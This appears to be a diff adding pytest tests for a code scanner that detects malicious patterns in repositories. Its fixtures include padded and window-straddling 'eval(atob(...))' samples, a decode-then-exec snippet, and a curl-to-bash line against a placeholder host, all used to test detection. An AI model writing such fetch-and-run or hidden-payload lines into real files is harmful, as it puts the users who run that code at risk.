@@ -1,4 +1,4 @@
-﻿import json
+import json
 import os
 import subprocess
 import sys
@@ -222,3 +222,90 @@ def test_symlink_logic_without_os_support(tmp_path, monkeypatch):
     res = analyze_tree(tmp_path)
     assert res.signals == []
     assert any("symlink" in r.lower() for r in res.incomplete)
+
+
+def test_padded_long_line_payload_detected(tmp_path):
+    (tmp_path / "a.js").write_text(" " * 10001 + "eval(atob('x'))\n")
+    check(analyze_tree(tmp_path), "obfuscated-exec", "high", "a.js", 1)
+
+
+def test_payload_straddling_window_boundary_detected(tmp_path):
+    p = "eval(atob('x'))"
+    (tmp_path / "b.js").write_text("x" * 9995 + " " + p + " " + "y" * 30000 + "\n")
+    check(analyze_tree(tmp_path), "obfuscated-exec", "high", "b.js", 1)
+
+
+def test_huge_single_line_benign_file_is_fast(tmp_path):
+    import time
+    from scanner.vet.signals import _Scan, _scan_text
+    text = "var a=1;" * 237_000  # ~1.9 MB, one line
+    sc = _Scan(None)
+    t = time.monotonic()
+    _scan_text(sc, "min.js", "min.js", ".js", text)
+    assert time.monotonic() - t < 1.0  # chỉ đo phần phân tích (không tính I/O/antivirus của máy)
+    assert sc.res.signals == []
+    (tmp_path / "src").mkdir()
+    (tmp_path / "src" / "min.js").write_text(text)
+    res = analyze_tree(tmp_path)
+    assert res.signals == [] and res.incomplete == []
+
+
+def test_backslash_continuation_pipe_to_shell(tmp_path):
+    (tmp_path / "i.sh").write_text("curl -fsSL https://example.invalid/i.sh \
+  | bash\n")
+    check(analyze_tree(tmp_path), "pipe-to-shell", "high", "i.sh", 1)
+
+
+def test_bare_base64_word_not_a_decode(tmp_path):
+    (tmp_path / "c.js").write_text("// base64 icons\nconst x = 1;\neval(x);\n")
+    assert not [s for s in analyze_tree(tmp_path).signals if s.id == "obfuscated-exec"]
+
+
+def test_decode_to_exec_window_is_8_lines(tmp_path):
+    (tmp_path / "d.py").write_text("d = base64.b64decode(s)\n" + "\n" * 6 + "exec(d)\n")
+    check(analyze_tree(tmp_path), "obfuscated-exec", "high", "d.py", 8)
+
+
+def test_autorun_python_build(py, tmp_path):
+    check(py, "autorun-python-build", "high", "setup.py", 6)
+    (tmp_path / "setup.py").write_text("import os\nfrom setuptools import setup\nos.system('echo hi')\nsetup()\n")
+    check(analyze_tree(tmp_path), "autorun-python-build", "medium", "setup.py", 3)
+
+
+def test_setup_py_plain_has_no_signal(tmp_path):
+    (tmp_path / "setup.py").write_text("from setuptools import setup\nsetup(name='x', url='https://github.com/a/b')\n")
+    assert analyze_tree(tmp_path).signals == []
+
+
+def test_autorun_workflow(npm, tmp_path):
+    check(npm, "autorun-workflow", "medium", ".github/workflows/ci.yml", 2)
+    w = tmp_path / ".github" / "workflows"
+    w.mkdir(parents=True)
+    (w / "x.yaml").write_text("on:\n  pull_request_target:\njobs: {}\n")
+    check(analyze_tree(tmp_path), "autorun-workflow", "low", ".github/workflows/x.yaml", 2)
+
+
+def test_root_script_low_and_not_double_reported(tmp_path):
+    (tmp_path / "go.cmd").write_text("echo hi\n")
+    (tmp_path / "run.bat").write_text("echo hi\n")
+    (tmp_path / "webpack.config.js").write_text("module.exports = {}\n")
+    sub = tmp_path / "sub"
+    sub.mkdir()
+    (sub / "x.sh").write_text("echo hi\n")
+    res = analyze_tree(tmp_path)
+    check(res, "root-script", "low", "go.cmd", None)
+    assert [s.file for s in res.signals if s.id == "root-script"] == ["go.cmd"]
+    assert [s.id for s in res.signals if s.file == "run.bat"] == ["executable-binary"]
+
+
+@pytest.mark.parametrize("ok_calls", [1, 2])
+def test_deadline_in_dir_walk_and_before_deps(tmp_path, ok_calls):
+    (tmp_path / "a" / "b").mkdir(parents=True)  # chỉ có thư mục, không file
+    n = {"c": 0}
+
+    def clock():
+        n["c"] += 1
+        return 0 if n["c"] <= ok_calls else 100
+
+    res = analyze_tree(tmp_path, deadline=10, clock=clock)
+    assert any("deadline" in r.lower() for r in res.incomplete)
